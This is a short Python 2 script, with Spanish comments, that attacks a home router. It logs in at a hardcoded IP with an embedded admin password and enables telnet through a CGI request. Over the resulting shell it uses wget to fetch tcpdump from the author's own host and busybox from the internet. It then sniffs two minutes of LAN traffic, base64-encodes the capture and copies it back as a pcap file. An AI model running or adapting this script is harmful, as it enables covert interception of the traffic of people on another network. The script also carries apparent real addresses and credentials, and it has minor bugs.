import mechanize
import telnetlib
import re
import os
import time

buscaips = re.compile("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")

ip = "201.253.157.47"
miip = "181.110.0.187"


b = mechanize.Browser()
b.set_handle_robots(False)
b.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)')]

def hastaAndar(direccion, ip):
    # el router suele tener un error y dice 400 bad request, asi que se reintenta
    r = b.open("http://" + ip + "/" + direccion)
    while "400 Bad Request" in r:
        print "mala respuesta"
        r = b.open("http://" + ip + "/" + direccion)

hastaAndar("login.html", ip)
hastaAndar("login.cgi?username=admin&psd=CalVxePV1!", ip)
hastaAndar("scsrvcntr.cmd?servicelist=HTTP=1,1,80;TELNET=1,1,23;FTP=0,0,21;TFTP=1,0,69;ICMP=1,0,0;SNMP=1,0,161;SAMBA=1,0,445;", ip)
hastaAndar("logout.cgi", ip)
        
# ahora ya tiene habilitado telnet, y como marca tiene deshabilitado el ftp local



user = "admin"
password = "CalVxePV1!"

tn = telnetlib.Telnet(ip)

tn.read_until("Login: ")
tn.write(user + "\n")
tn.read_until("Password: ")
tn.write(password + "\n")

#vamos a sh
tn.write("sh\n")
tn.read_until("#")
#vamos a donde podemos escribir
tn.write("cd /tmp/\n")
tn.read_until("#")
#reviso si tiene tcpdump
tn.write("ls\n")
if "tcpdump" not in tn.read_until("#"):
    tn.write("wget http://%s/tcpdump\n" % miip)
    tn.read_until("#")
#reviso si tiene busybox
tn.write("ls\n")
if "busybox" not in tn.read_until("#"):
    tn.write("wget http://www.busybox.net/downloads/binaries/latest/busybox-mips\n" % miip)
    tn.read_until("#")

tn.write("chmod +x busybox-mips\n")
tn.read_until("#")

#genero pcap
tn.write("./tcpdump -i br0 -n -s 0 -w textfile.pcap\n")
time.sleep(120)
tn.write("\x03")
print tn.read_until("#")
#lo convierto a base64
tn.write("./busybox-mips base64 textfile.pcap\n")
datos = tn.read_until("#")
tn.write("\x03")
tn.write("\x04")
tn.write("\x04")

# print datos

datos = datos.split("\r\n")
datos = datos[1:-1]
nada = ""
datos = nada.join(datos)

datos = datos.decode("base64")

f = open("paquetes.pcap","w")

f.write(datos)

f.close()


